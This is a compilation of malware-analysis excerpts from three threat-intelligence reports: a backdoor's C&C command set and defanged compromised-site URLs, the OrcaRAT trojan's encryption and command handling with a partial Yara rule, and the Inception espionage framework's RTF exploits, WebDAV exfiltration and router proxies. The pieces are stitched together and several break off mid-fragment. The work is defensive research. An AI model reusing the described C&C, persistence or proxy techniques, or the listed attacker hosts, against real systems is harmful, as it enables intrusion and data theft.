SystemInformation, value names: SystemManufacturer, SystemProductName.•  All registry subkeys of the key HARDWARE\DESCRIPTION\System\CentralProcessor, value 

name: ProcessorNameString.•  Available system memory status, total/free.2.OS version information; the newest version known to it is Windows 7 / 2008R2.Unidentified  

   versions are marked as “not support this version of Windows”.3.Computer name (“ComputerNamePhysicalDnsFullyQualified”).TLP: GreenTLP: GreenFor any inquire please contact intelreports@kaspersky.comFor any inquire please contact intelreports@kaspersky.com4

4.User name, local group name.5.Common directory names: system, current, temporary directories.6.Additional system information:

•  System and user language settings
•  User locale information: country name, current date, time zone.•  Uptime

7.Disk space information for all available logical drives.8.List of available network shares.9.List of all user accounts, privilege classes, time of the last logon.10.List of current IPV4 TCP connections and UDP listeners.11.Information about installed Windows updates from the file 
%WINDOWS%\SoftwareDistribution\ReportingEvents.log.12.Detailed list of running processes and their owners.13.List of all window titles.14.Directory listing of available logical drives and of the directories: 

•  Desktop 
•  %TEMP%
•  %WINDOWS%\Temp

The retrieved information is compressed using bzip2, encrypted with AES and then encoded using 
Base64 before being transmitted to the C&C server.When there is a file waiting for upload (usually, 
this is file that contains the results of the previously received and executed command), it is read 
from disk and uploaded to the server instead of the system information.The C&C communication is implemented on top of the standard HTTP/HTTPS protocols.The list of 
the C&C URLs is hardcoded in the binary but may be overridden by further commands.C&C server communication cycle

TLP: GreenFor any inquire please contact intelreports@kaspersky.com5

The module uses Wininet API functions for issuing HTTP POST requests to the server.The module 
transmits the collected information in the body of the POST request and gets new commands from the 
server’s response.The request body can be empty if there is no new information to upload.The response 
is usually an HTML document and the commands are Base64-encoded strings enclosed in <div>/</div> 
tags.Every command is encrypted using asymmetric encryption with temporary AES session keys.Each command is a mixed text/binary buffer.It consists of two parts: payload and configuration.The configuration is an INI file that controls the further behavior of the module.It is extracted 
into a temporary file named %TEMP%\~D%random%.tmp.The payload, if exists, is supposed to be an 
executable file and may be executed if there is a corresponding command present in the INI part.The format of the decoded command is the following:

Format of the C&C command buffer

Available commands are:

Name

exe

down

Description
Execute a command, redirect its output to the file %TEMP%\~D%random%.tmp.The file is then uploaded during the next C&C communication cycle.Change the C&C URL to a given value.del_task

Delete a file.result

Set the filename that is supposed to contain the results of command 
execution.Effectively, any existing file may be marked for upload by this 
command.TLP: GreenTLP: GreenFor any inquire please contact intelreports@kaspersky.comFor any inquire please contact intelreports@kaspersky.com6

Name

delete

name

Description

Mark the file %TEMP%\~tmp085.dat to be deleted on reboot.]com/wp-content/plugins/wp-themes/
hxxp://gspersia[.]com/first/fa/components/com_sitemap/
hxxp://blog.epiccosplay[.]com/wp-includes/sitemap/
hxxp://gofree[.]ir/wp-content/plugins/online-chat/
hxxp://homaxcompany[.]com/components/com_sitemap/
hxxp://www.hadilotfi[.]com/wp-content/themes/profile/
hxxp://mortezanevis[.]ir/wp-content/plugins/wp-static/
hxxp://ncmp2014[.]com/modules/mod_feed/feed/
hxxp://mebroad[.]com/wp-content/gallery/posters/img/
hxxp://gruenerenate[.]de/wp-content/plugins/bbpress/includes/lang/
hxxp://www.arshinmalalan[.]com/themes/v6/templates/css/in.php
hxxp://products.parentsupermarket[.]com/phpMyAdmin/
hxxp://c-si[.]ir/includes/
hxxp://mkiyanpoor[.]ir/wp-includes/
hxxp://www.massage-ketsch[.]de/wp-includes/
hxxp://onereliablesource[.]com/wp-content/plugins/sitemap/
hxxp://petrymantenimiento[.]com/wp-content/plugins/wordpress-form-manager/lang/
hxxp://ohsoverydarling[.]com/wp-content/themes/verification/
hxxp://poissonnerieantoine[.]com/web/wp-content/themes/titan/view/
hxxp://www.gholghola[.]com/azemashoorhost/smarty/tmpl/
hxxp://www.saglikdetay[.]com/wp-includes/images/icons/
hxxp://www.entesharati[.]com/wp-content/plugins/edd-paginate/
hxxp://iranabad[.]com/sarzamin/cms/application/classess/plugins/
hxxp://deltateam[.]ir/components/com_sitemap/
hxxp://akva-clean[.]ru/typo3temp/
hxxp://discontr[.]com/wp-content/themes/twentytwelve/
hxxp://curaj[.]net/pepeni/images/
hxxp://executrek[.]org/components/com_sitemap/
hxxp://amoodgostar[.]com/wp-content/themes/simplebanner/
hxxp://gayamore[.]com/gallery/090607/
hxxp://www.automation-net[.]ru/typo3temp/
hxxp://www.lacitedufleuve[.]com/Connections1/
hxxp://www.aspit[.]sn/administrator/modules/mod_feed/

TLP: GreenFor any inquire please contact intelreports@kaspersky.comE. Intermediary level proxies (hacked sites used as 2nd/3rd level):

11

hxxp://masterciw[.]com/
hxxp://khrn[.]tk/wp-includes/
hxxp://pradlolux[.]cz/system/helper/
hxxp://original-key[.]com/catalog/controller/payment/
hxxp://www.noraci[.]com/wp-includes/
hxxp://tuvpr[.]com/backup/wp-includes/
hxxp://www.boshraamin[.]com/wp-includes/
hxxp://www.bestjob[.]my/system/modules/comments/
hxxp://rollinghillsfitness[.]com/wp-includes/

TLP: GreenTLP: GreenFor any inquire please contact intelreports@kaspersky.comFor any inquire please contact intelreports@kaspersky.com12

F. Motherships, hosting Epic Control panels and exploits

hxxp://avg-update.sytes[.]net/
hxxp://newsforum.servehttp[.]com/
hxxp://newsweek.servehttp[.]com/
hxxp://adobe.faqserv[.]com/
hxxp://cqcount.servehttp[.]com/
hxxp://easycounter.sytes[.]net/
hxxp://newsweek.serveblog[.]net/
hxxp://image.servepics[.]com/
hxxp://bgl.serveftp[.]net/

TLP: GreenFor any inquire please contact intelreports@kaspersky.comOrcaRAT - A whale of a tale

By Dan Kelly and Tom Lancaster

It’s every malware analyst’s dream to be handed a sample which is, so far, unnamed by the AV community
- especially when the malware in question may have links to a well-known APT group.In my line of work I analyse several ‘unknown’ malware samples a week, but often it turns out that they
are simply new variants of existing malware families.Recently I was fortunate enough to be handed
something that not only had a low detection rate but, aside from heuristics, seemed to be relatively
unknown to the top 40 anti-virus companies.In this post I will walk you through the malware family we’ve dubbed “OrcaRAT”.First of all, it is worth pointing out that most of the malware I see on a day-to-day basis is espionage
orientated, and very rarely do the programmers and operators make much effort to cover their tracks.The
use of forged HTTP headers is a common occurrence and simple mistakes within these headers are
frequent.The malware in question was handed to me by one of our threat intelligence analysts who was hunting
through infrastructure associated with some samples of Comfoo[1] malware and happened across a
malware sample (253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613) he didn’t
recognise.He immediately took the malware and passed it through first stage analysis, which involves
running the file in a sandbox environment.After this, he handed it over for more in-depth capability
analysis.The structure

I began by looking over the sandbox report.The first thing that drew my attention was the URI structure.(A screenshot showing the HTTP headers and URI structure that OrcaRAT produces)

To those of us who are familiar with decoding data, you will notice that the URI string formatting appears
to be a modified version of the Base64 algorithm.To understand this structure more, we must reverse engineer the functions that generate and then encode
the data.Firstly we begin by analysing the routines that produce the data which is later encoded and sent
in the HTTP URI field.The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of
the code.There are also a significant number of Windows Crypto API[2] functions imported by the
malware, so we can assume this indicates that it uses encryption.(A screenshot showing the functions that are imported by OrcaRAT)

Delving deeper in to the disassembly, we come across the preamble to the URI generation function:

(A screenshot showing the decoding and generation of a string value)

The function above uses Windows crypto API to generate a random number of 6 bytes, then dynamically
builds and appends the word “OrcaKiller” on to the end of this number.In one such example the final
product was "\x61\xBA\xF4\x44\x52\xF1OrcaKiller" (where \x denotes hexadecimal values).Once this value has been produced, the malware begins constructing the URI.With many pieces of
malware the initial communications that it sends out to its command and control server (known as
beaconing or phoning home) usually include pieces of information about the victim system.OrcaRAT is no
exception.The randomly generated values noted above are actually used to encrypt several pieces of
information that are extracted from the system, and even the key itself is included.(A screenshot showing an encryption function used by OrcaRAT)

All of the values extracted from the system are encrypted using the RC4[3] algorithm and then base64
encoded.The RC4 encryption key is derived from an MD5 hash[4] of the randomly generated bytes
concatenated with the ‘OrcaKiller’ string.Once the data has been encrypted it is base64 encoded.Any
forward slashes in the base64 string are replaced with a tilde - pseudo code is shown below.Once all of the values have been encrypted and formatted the URI has the following structure:

 

(A screenshot showing the URI structure of OrcaRAT command and control activity)

The campaign ID value is constructed using a method similar to that for the encryption key.(A screenshot showing the generation of the first hidden string value)

It would appear that the authors did not want anybody to be able to easily see this value.This now gives us OrcaKiller and wHaLe.It would appear that our adversary has a salty sense of humour.Command and control

As with all malware, the command and control functions reveal the true nature and intent of the
operators.Up until now we have only determined how the malware communicates with the server.We will
now investigate the mechanisms that the server uses to communicate and interact with the victim.The command and control routine in OrcaRAT appears to serve two purposes.Interestingly these routines
are split in to two branches.Each branch of command and control activity is determined by the unique
response from the remote server.Command and control takes form of a webpage.Unlike malware
designed by the well-known Comment Crew[5], this group does not hide these commands in HTML
comments, but instead places them in plain view.The first set of commands force the malware to behave
as a simple downloader.(A screenshot showing OrcaRAT parsing the HTML code behind a webpage)

Upon downloading the webpage from the server the malware looks for specific sets of HTML tags.The
first set are <P> and the terminating tag </P>.Once the malware has found these tags it drops in to the
first command and control function.The malware then extracts the payload text between the HTML tags
and runs it through a decryption routine.The same encryption key that is sent in the URI string is used to
decrypt the text.Once the payload text has been decrypted the malware treats this as a binary executable
file, which is then written to the disk and executed.The second set of HTML tags allows the operator to drop the malware in to a set of remote control
functions.This time the malware searches for the <H1> tag that is terminated by </H1>.Once the payload
text between these tags has been extracted it is then decrypted using the encryption key found in the URI
string.The payload text from this page is much smaller and ultimately points to the command function
that the operator has executed.(A screenshot showing the structure of the command and control routines within OrcaRAT)

The command and control structure is fairly simplistic but provides the operator with access to the victim
machine’s filesystem and command line, and as such allows the attacker to perform various tasks such as
executing arbitrary commands or uploading and downloading files from the compromised system.After a command and control message is received, OrcaRAT sends an HTTP POST message back to the
command and control server.Each time that the URI is built it generates a new encryption key, showing
that the command and control server is at least serving dynamic content.Given the command structure
above, it is logical to assume that the command and control server requires an operator to manually issue
specific commands to the victim workstation, with the default command likely being ‘sleep’.Given the information above we can reasonably assume that this malware was most likely designed as a
first stage implant.History has shown that malware designed in this way is usually done so to allow the
operator an initial level of access to the compromised system, usually for surveying the victim and then
deciding whether to deploy a more capable and valuable second stage malware implant.Detection 

Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it.Firstly we will cover disk detection using Yara.The rule below will detect an OrcaRAT binary executable
that has been written to a compromised machine’s disk.$err2="Set return time   success!"$err3="Quit success!"condition:

       $MZ at 0 and filesize < 500KB and   (all of ($apptype*) and 1 of ($err*))
  }
 

OrcaRAT can also be detected in two separate ways at the network level using a Snort or Suricata IDS rule.Detecting malware at different stages of connectivity can be important.By creating signatures with a
nexus to the kill chain[6] we can determine which stage the intrusion has reached.The two signatures
below will indicate whether the intrusion has reached the command and control or action-on phases.Whitepaper:
The Inception Framework:
Cloud-hosted APT


By Snorre Fagerland and Waylon Grange
Blue Coat Systems, Inc




                                        1
Executive summary

Blue Coat researchers have uncovered a previously-undocumented, highly
automated, and extremely sophisticated framework for performing targeted
attacks.The framework is notable for a number of reasons, including (but not
limited to) its use of a cloud-based infrastructure for command-and-control and its
use of the WebDAV protocol to send instructions and receive exfiltrated
information from compromised systems.Initial malware components were embedded in Rich Text Format (RTF) files.Exploitation of vulnerabilities in this file format is leveraged to gain remote access
to victim’s computers.The framework, thus far, has been using the services of a cloud service provider
based in Sweden, CloudMe.com, for its main command-and-control
infrastructure.Malware payloads designed for a wide array of potential devices,
including home routers and mobile devices running iOS, BlackBerryOS or
Android, were also recovered during the course of our research.The framework is designed in such a way that all post-infection communication
(i.e.target surveying, configuration updates, malware updates, and data
exfiltration) can be performed via the cloud service.The malware components of
this framework follow a plugin model, where new malware rely on other,
previously delivered malware components to interact with the framework.Initial attacks were largely focused on Russia and a few other Eastern European
countries.However, we have later seen that attackers are interested in targets all
over the globe.The framework is itself target-agnostic, and seems highly automated.The operational security exhibited by the attackers is very good - among the best
we have seen.Most interaction between attackers and their infrastructure is
performed via a convoluted network of router proxies and rented hosts.Although the attackers have left a few clues, we have been unable to provide
attribution with any degree of accuracy.2
Introduction

The use of software vulnerabilities in order to execute malicious software on
unsuspecting users’ computers is an important parameter to monitor.This
method of attack is not only known to have a considerable success rate, it is also
often deployed by resourceful attackers and, as such, marks a threat worth
paying attention to.The use of exploits in document formats like PDF, DOC and RTF is in some
ways especially noteworthy.Documents are commonly exchanged via mail,
which make them perfect for email-borne targeted attacks; what is otherwise
known as spear phishing.In March, 2014, Microsoft published information about a new vulnerability in Rich
Text Format (RTF).This vulnerability, named CVE-2014-1761 (Microsoft Word
RTF Object Confusion), had already been used effectively by attackers at the
time of the announcement.Two previous vulnerabilities in the RTF file format,
known as CVE-2010-3333 and CVE-2012-0158, had become, by that time,
mainstays of targeted attacks, so we tracked how attackers implemented this
new exploit with keen interest.By late August, we identified a malware espionage operation that used both the
CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the
malicious payload, and which leveraged a single cloud service as the backbone
of its entire visible infrastructure.When we examined the suspicious documents, it was discovered that they were
somewhat anomalous compared to the run-of-the-mill material.They turned out
to belong to a highly advanced and professional targeted attack framework,
which utilized a complex series of techniques to survey potential targets.Due to the many levels of obfuscation and indirection, we named this the
Inception framework; but there ends all similarity with the movie by the same
name.Leonardo DiCaprio is not associated with this investigation.3
PART I:

CloudMe




          4
Use of trojanized documents

We initially knew little about who the actual targets were; apart from one.In that
particular case we had the actual phishing email, so we knew the apparent
recipient – the CEO of a large Russian bank.The email was apparently sent from
“Mrs.World”; note the Mrs., and not Miss - World.The weaponized Microsoft Word document attached to the email message
(“photo.doc”) contained two separate exploits: one targeting the vulnerability
detailed in CVE-2012-0158 (MSCOMCTL ActiveX Buffer Overflow); the other
targeting the aforementioned CVE-2014-1761.5
Above: “Mrs.World”.Text and picture apparently taken from the news site mk.ru


We soon discovered that our malware repository contained several other, similar
documents, but these had come from other sources which did not include the
email message, or any identifiable information about the targets.However, the
text of the documents covered a variety of topics mostly revolving around
Russian issues relating to a variety of business sectors.The following pages
highlight a representative selection of these documents.6
An article cribbed verbatim from the
Novye Izvestiya news Web site
about the Russian financial situation
in light of the Ukrainian crisis.An application form to participate in
a seminar supposedly organized by
Russia’s Federal Service for
Defense Contracts (“Федеральная
служба по оборонному заказу”)
scheduled for Sept 24/25 2014.An article, in English, about the
Ukraine situation taken from the
Financial Times (UK) newspaper.An “advertisement” from a supplier
of diesel engines and related
mechanical services.The letter lists
the Russian navy and the Border
Guard department of the FSB
among their customers.7
“Organigrama Gobierno Rusia.doc”
– a summary profile of several high-
level Russian government officials –
originally submitted to VirusTotal
from an IP address in Spain.An advertisement of a used car for
sale that purportedly originated from
an employee at the German
Embassy in Moscow.Invitation to Russian Art Week




                                 8
Document metadata


All documents that we have found so far have been rather standard Word
documents, of the old 97-2003 compatible format based on OLE2.Such documents can, and typically do, contain quite a bit of metadata: The name
of the document creator; the user who edited it most recently; the name of the
company whose copy of Word was used to create the document, et al.Users can
optionally configure Word to remove this metadata when a document is saved,
and that’s exactly what the creator of these documents did, stripping out this
potential source of attribution data.However, Word documents in this format contain additional information, if you
know where to look.All Word documents of this format contain what’s known as a File Information
Block (FIB).The FIB contains information about the file’s internal structure, and
also – to some extent – data on the program used to create the file.In the case
of the samples we analyzed, all of the documents were saved using the same
build of Microsoft Word from Office14 (better known as Office 2010).In addition, documents can contain slack space in which old data remains.For
example, the decoy that came with the attack named “Organigrama Gobierno
Rusia.doc” contains Visual Basic leftovers indicating that it originally was created
on a computer that was configured to be used by a native Spanish speaker,
apparently by an advisor at the Spanish Embassy in Moscow.This document
was presumably obtained by the attackers and repurposed for the attack.9
Targeted verticals


Despite the limited information at our disposal about the targets of these attacks,
their content reveals some context about who the possible targets may have
been.The
malicious content is stored inside the document in encoded form, and the
shellcode decodes and writes this to disk.Above: The decoding loop


Upon successful execution this code drops a Word document and a Visual Basic
script.The Word document is displayed to the user to avoid arousing any
suspicion while the script is executed in the background.Unusual for many exploit campaigns, the names of the dropped files vary; for
example HyHa9AJ.vbs, ew_Rg.vbs, 0_QHdN.vbs, etc.– clearly randomized in
order to avoid detection by name.11
Visual Basic Script dropper


The VBScript dropper code is also a little unusual.It declares a Windows
Management Instrumentation (WMI) object in order to reach components like the
registry and file system.This seems adapted from Microsoft example code, like
the one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx




When the VBSript is run it drops two files to disk.One is a polymorphed dll file
and the other a binary data file with no obvious internal structure.This data file
turns out to be encrypted using AES-256.12
The files will be installed in several locations:

%WinDir%,            ex.“C:\Windows”.%APPDATA%,           ex.“C:\Users\USERNAME\AppData\Roaming”
%ALLUSERSPROFILE%, ex.“C:\ProgramData”
%CommonProgramFiles%, ex.“C:\Program Files\Common Files”
%USERPROFILE%,       ex.“C:\Users\USERNAME”

These locations will vary some between operating system versions.The VBScript then sets a startup key in the
“HKCU\Software\Microsoft\Windows\CurrentVersion\Run” registry path to
execute the DLLs at boot time.Regardless of whether the registry launches the DLL or when another malware
executable starts the DLL directly, the DLL is launched using regsrv32.exe with
the /s (silent) option.The names of these dropped files change from attack to attack.The one above
drops ctfmonrc.dll.Other names observed were:

ctfmonm.dll
ctfmonrn.dll
wmiprvse.dll
alg.dll
dwm.dll

The encrypted data files are named using random words apparently taken from a
dictionary – “acholias”, “arzner”, “bicorporate”, “crockrell”, “damnatorily” etc.13
DLL payload

Looking at one of the dropped dlls we can see the authors originally called it
95Num3P3gm.dll.polymorphed.dll.When executed it will rebuild the original dll
(95Num3p3gm.dll, presumably), load it from memory and pass over execution.In the early stages of our research, most other payloads followed the same
naming convention, eg., fvK3J15B5d.DLL.polymorphed.DLL;
LvwU9gnFO.DLL.polymorphed.DLL; NR5vaFTe9R.DLL.polymorphed.DLL;
hs78lg7x5F.DLL.polymorphed.DLL, etc.More recently collected samples no
longer contain the “polymorphed” string.It is hard to describe the polymorphed dlls with any real depth, as there is little
consistency between them.When two nearly identical dlls are encoded using the
polymorphic scheme there is very little code in common.The call graphs are
different and key functions have varying number of arguments.The polymorphing
mechanism also generates, and inserts, unique functions all of which make calls
to different floating-point operations – all done just to obfuscate the actual
decoding process.The sizes of buffers allocated are also randomized to mask
their intent.14
A portion of one of the dynamically generated functions.What is common is that somewhere along the execution cycle is one extremely
large function (over 200 kb in length) where early in a large allocation is made
where the un-obfuscated binary will be placed.The binary is then built from de-
obfuscating segments of it that have been dispersed through the ‘.rdata’ section.The order, size, and locations of these segments vary from build to build but
somewhere near the end of the large function there will be a call to a subfunction
that loads the PE image into memory, followed by a call to free the PE image
allocation from memory.Simply halting execution before this function call permits
a researcher to extract the reconstructed DLL from memory.15
Here, pausing execution before the call to ‘load_pe_from_memory’ reveals the
extracted PE at the memory address pointed to by edx.This reconstructed DLL, once loaded, will decode a configuration structure from
its ‘.data’ section which contains three important details: the name of the
encrypted data file dropped by the VBScript; the AES key used to decrypt the file;
and the name of a unique global mutex to hold while running to prevent multiple
instances.This configuration information is used to load the encrypted file into memory and
decrypt it.This turns out to be yet another dll.The first ordinal exported by this dll
is located and then called, passing in the configuration and the name of the
encrypted file on disk as parameters.16
This last dll is the heart of the threat (originally called q5Byo.dll in this instance.This file contains the true intent of this campaign.It is designed as a survey tool.The PE file gathers system information including OS version, computer name,
user name, user group membership, the process it is running in, locale ID’s, as
well as system drive and volume information.All of this is encrypted and then
sent to cloud storage via WebDAV.17
The malware installation chain




                                 18
WebDAV cloud usage

WebDAV is a communication standard that allows file management over HTTP
or HTTPS.Windows allows WebDAV sessions to be mapped as network
resources.The use of WebDAV as the communication channel is atypical for most malware
samples we see.By using a network resource, the actual web traffic originates
from the system itself, and not from the process in which the malware resides.Additionally, once the resource is established, the malware can transfer files to
and from the command and control servers using standard file IO commands.All the authentication information for the WebDAV session including the URL,
folders, path, user name, and password is stored within this last DLL in another
AES-encrypted configuration structure in the binary.A unique path, username, and password were used for each malware instance
we’ve seen in the wild.This allows the attackers to uniquely identify every
targeted attack and track how successful each phishing campaign is.Also contained within the configuration structure is information on how to name
the survey data on the remote file server.The binary reads from its configuration
a string on how to generate the remote filename, and a list of extensions to use.An example would be “_1-7d_0-8s”, [“TIF”, “TAR”, “SIT”] which instructs the
binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to
8 ASCII letters with one of the three listed extensions such as “664gher.TAR”.The survey is then uploaded to the server in a specified folder with the generated
name.Files are compressed using a modified LZMA-compression and encrypted using
AES cipher-block-chaining (CBC) before being uploaded to the cloud server.The binary also checks a separate folder on the cloud service designated to
contain new configuration information.If such a file is present on the server, the
malware downloads the new configuration file then deletes it from the server.19
The cloud storage provider in every case we have seen was the Swedish
company CloudMe.com, which offers free and paid WebDAV cloud storage.The URI model used by the malware is
http://webdav.cloudme.com/%username%/CloudDrive/ which is a direct
reference to file storage.It must be noted that the CloudMe service is not actively spreading the malicious
content; the attackers are only using it for storing their files.We notified CloudMe.com about the abuse of their services.Their CEO, Mr.
Daniel Arthursson, was none too happy about this, and was very helpful in our
further research.CloudMe has shared a great deal of log information related to
this attack.These indicate that there are many other accounts (over 100) likely
related to this attack system.We have no way of verifying this with absolute
certainty, but this is what we regard as a high confidence assumption.20
Distribution of logged victim connections towards CloudMe.The cloud accounts are not used for one-way communication only.The malware
also checks configured subfolders for updates; and if these are found they will be
downloaded, decrypted and used as appropriate.One such case is the franko7046 account, used against the previously
mentioned bank CEO.In this account there was hidden another encrypted
configuration file which the malware downloaded and decrypted.Above: The configuration file of the depp3353 account.Password is redacted.21
This is how we found the depp3353 account.In this new account there was
another surprise waiting for us – a download folder with two new encrypted files,
921.bin and 922.bin.Once decrypted, these turned out to be PE executables.Downloaded plugins: Cloud persistence

The two new executables are plugins - quite similar to each other and obviously
compiled on the same setup.They are lightweight and intended to pull specific
survey information from their target.Of interest, both of the DLLs originally had
the same internal name (78wO13YrJ0cB.dll).Presumably the same PE
sanitization script and parameters were used on both.None of these plugins contain any means of CnC communication.Instead, when
they are executed they are passed a pointer to a function to use for sending data
back home.Neither are they ever written to disk.They are executed in memory
only, and once they have completed the memory is freed.This makes these
modules extremely stealthy, flexible and compatible with multiple toolsets
independent of what CnC method is being used.921.bin retrieves several datapoints about the infected machine: Domain info; a
list of running processes with all loaded modules in each; the list of installed
software; and a complete hardware profile of the target machine.922.bin
compiles a dirwalk – a complete listing of every file path – of each fixed drive.All
of this information is exfiltrated back via the same WebDAV connection.This model makes it possible to do the intrusion in steps, with verification stages
in between; and the files will not be easily found on affected computers.Based on the information gathered from these modules, the attackers appear to
move to the next stage of their attack by placing more new components on the
WebDAV shares.Information about these uploads is limited by the fact that we
do not have the AES keys to decrypt much of the uploaded data, but we have
been able to see some upload patterns.What we assume to be third-stage plugins appear on the shares as *.bin files of
roughly 72kb.As with other plugins, these are downloaded and deleted from the
share in one go.However, the next day, another *.bin file of the same size will be
uploaded to the share.This is a pattern that repeats itself over all live accounts.It
seems that because the plugins exist in memory only, they are injected daily to
ensure persistence on victim computers.Our theory is that this malware is a
more typical datastealer, and we have observed that after this type of file is
planted on the account, encrypted data uploads from compromised users
increase.22
The Sheep and the Wolves

Victims of this attack will connect using the Windows WebDAV redirector, and
the HTTP request user-agent string will reflect this.For Windows XP this will
typically be “Microsoft-WebDAV-MiniRedir/5.1.2600”, and for Windows 7 a
common user-agent is “Microsoft-WebDAV-MiniRedir/6.1.7601”.Security researchers – and there are a few of them - connect in a variety of ways;
first of all, we see a number of connections that are indistinguishable from the
way victims connect.This happens when researchers use lab machines with live
internet access to run the malware.The only way we can tell these are
researchers is because they connect from IP address ranges that are unlikely to
be victims; and they also tend to consist of short-lived sessions.Some researchers set up scheduled tasks to scan the shares for new updates
and malware.We see a few variations of these – one typical configuration is
where the requests contain a Python-related user-agent string.Attackers, on the other hand, don’t appear to use Windows.Common across multiple accounts, multiple IP’s, and over time, is that the
probable attackers have used a HTTP user-agent of “davfs2/1.4.6 neon/0.29.6”.We know these are not researchers, because we can see malware files being
uploaded by them:

[17/Sep/2014:09:42:38 +0200] "PUT
/white3946/CloudDrive/QxM9C/st/V1oINDJtnqy/1768.bin
HTTP/1.0" 201 0 "-" "davfs2/1.4.6 neon/0.29.6"

Above: Log entry for the account white3946.We have been unable to locate the
malware that uses this account.We have a log fragment in which the attackers uploaded a sequential series of
updates (from 1746.bin to 1774.bin) within 1.5 hours on Sept 17th, spread over
27 different accounts and using 27 different IP addresses in the process.The user-agent string shows that attackers likely have used a client based on the
open source davfs2 file system for Linux to mount the WebDAV shares.23
This client is used when uploading new malware, but also when the attackers
scan their shares for new victim updates, in which case the shares are
enumerated by requests in a scheduled manner.An attacker scans the tem5842 account for updates.At intervals, scans hop to new IP addresses.The attackers have used a large number of IP addresses to access the shares.As mentioned above, there is a rotation scheme in place in which a new IP
address will be used after a few minutes of access against CloudMe accounts.These IP’s are distributed widely over geographical locations and service
providers, with a heavy bias towards South Korean ranges.However, this
turned out to be a wrong assumption.25
PART II:

Support infrastructure




                         26
An embedded device proxy network

A superficial examination of the proxy IP addresses that connected to CloudMe
showed them to be internet-connected devices of various kinds.Many were
Korean Tera-EP home routers; but there were several other products
represented.It is believed that the attackers were able to compromise these devices based on
poor configurations or default credentials.We were able to do some forensic work on a compromised Tera-EP TE-800
device and discovered another dimension of the attacker’s infrastructure.27
Router malware

Under the ramfs mounted partition we found a stripped and statically linked
MIPS-el binary named tail-.Instances of this were also found under the running
process list.tail- serves as a SOCKS proxy for the attackers.Each sample of the binary we
were able to acquire was configured with a unique 32byte blowfish key and a
small, encrypted section appended to the end of the binary.Upon execution the binary uses its hardcoded key to decrypt the configuration
section and retrieve the listening port to use for incoming connections.This acts
as a management interface.From here the attackers can request a specific port
to be opened as one of the following types: SOCKET, SOCKSS, SOCKAT,
SOCKS5, or STATUSPORT.To prevent anyone else from accessing this service all communication on the
management interface is encrypted using the same blowfish key.This means
that the attackers must maintain a list of where each of these implants are
installed, as well as what port and key each is configured to use.This setup makes it difficult to identify embedded devices compromised with this
malware by scanning open ports.In the wild we witnessed the attackers connect to the management port and
request SOCKSS connections.This would open the specified port and wait for
configuration data, which consists of a domain name (webdav.cloudme.com), the
destination port, and a variable length RC4 key, all of which encrypted using the
blowfish key.Once received the malware would attempt to connect to the
domain name on the specified port and would start tunneling all traffic received
from the SOCKSS port to the destination and vise-versa.The communication
between the attacker and the SOCKSS is encoded using the RC4 key.The
graphic below illustrates a typical session.28
Additional servers

The router proxy network provides another layer of indirection masking the
attackers’ infrastructure.However, because we captured traffic through one of
these embedded devices we could identify other parts of their operation.We identified four IP addresses that connected to the proxy malware:

Cloud enumerator:
Apparently a rented server at AS34224 NETERRA-AS, Bulgaria

This host belongs to a Bulgarian VPS service and would use the router proxy to
connect to webdav.cloudme.com.This host does all scanning of webdav shares
for stolen user data, and also uploads new malware components.Health checker:
Apparently a rented server at AS5577 ROOT root SA, Luxembourg.This IP would make connections hourly and poll the status of the router proxy
malware.This machine is most likely used to track which compromised routers
are currently available for use.Unlocker:
Apparently a rented server at AS52048 DATACLUB DataClub S.A. Latvia.Traffic from this IP had a very specific purpose: It unlocked routers for proxying in
connection with the sending of phishing emails.In the wild we observed this IP connect to our router on the malware
management port and specify a SOCKSS proxy port to be opened.Immediately
after, the newly opened port would be connected to by another IP and used to
send phishing emails with malicious attachments.However, later we observed that the Email sender IP at VOLIA vanished and the
Unlocker server taking over its role as well.Email sender:
An IP at AS25229 VOLIA-AS, Ukraine.Possibly a compromised host.After a router SOCKSS port was opened by Unlocker, this IP would connect to
the opened port and tunnel its email traffic through the router.Each of these connections used the correct encryption key, so we know that
these accesses came from the attackers and not some opportunistic third party.29
Mail proxies:

Through our router monitoring we identified two mail proxies used by the
attackers.We were later notified by Symantec (thanks, guys!)about a third.These servers were hosted on domains that were registered by the attackers,
using domain names clearly meant to look legitimate.This is the only time we
have seen attackers register domains in this investigation.30
Observed phishing emails

The connections made from the Ukrainian host to the router were interesting.After being proxied though the router, each of these would authenticate with one
of the dedicated mail proxies and send out phishing attacks.From captured traffic it appears that the mail proxies have SOCKSv5 services
running on obscure high ports.We have documented that the attackers log in to
these using apparently randomly generated usernames and passwords, a unique
pair for each server.The mail proxy would then relay the spearphishing mail as
seen below.Above: Captured SMTP session, sending the malicious attachment MQ1474.doc

This way the attack can be mistaken to come from legitimate businesses and
trusted organizations.In some cases the organization from which the phishing
email originates would appear to be a known associate to the target.31
The email shown above was one of a number of messages sent to targets in the
oil industry.Investigating the target email addresses, we saw several of these
were found in this public document from the World Petroleum Council, including
some addresses that are, at the present time, no longer valid.And then, the ground shifted again.32
PART III:

Attacks on mobile devices




                            33
One of the spearphishing mails we observed coming through the router network
was this one, sent to an address under the gov.py (Government of Paraguay)
domain.Get WhatsApp now for your iPhone, Android, BlackBerry or Windows Phone

There was no executable attachment in this mail, but instead a link shortened by
the URL shortener service bit.ly, with the underlying link pointing to an IP address
on a Dutch hosting service.Clicking that link from a Windows PC only yielded a
redirection to the BBC homepages, and using other devices did not give more
data.The bit.ly service does however provide information on the user creating the
shortened link, and other links associated with this account.In this case, the user
was named nicolatesla53.34
The nicolatesla53 bit.ly profile page

The nicolatesla53 account was created in July 2014.From Oct 24th to Nov 21st
this user created nearly 10000 shortened links – we harvested 9990 unique
ones.Three IP addresses were used for these links:

82.221.100.55
82.221.100.60
94.102.50.60

The links themselves were on this format:

http://server_ip/page/index?id=target_identifier&type2=action_code

As far as we were able to tell, there were three main types of action_code:

743 : Serve malware disguised as WhatsApp updates
1024 : Serve malware disguised as Viber updates
other : Serve MMS phishing content.The code identifies mobile operator and
determines which logo will be displayed when the user follows the link.35
MMS Phishing

We have no sample of the actual MMS phishing messages apparently being
sent, but we can see the page served when a user clicks a spammed link.This is
just a dialogue box asking for the password presumably included in the initial
message, and the next stage likely involves download of malicious content.The password screen for action code 16611 (TELE2)

We were in the middle of harvesting the servers for data on the various action
codes when they all were abruptly taken offline; so our data on which mobile
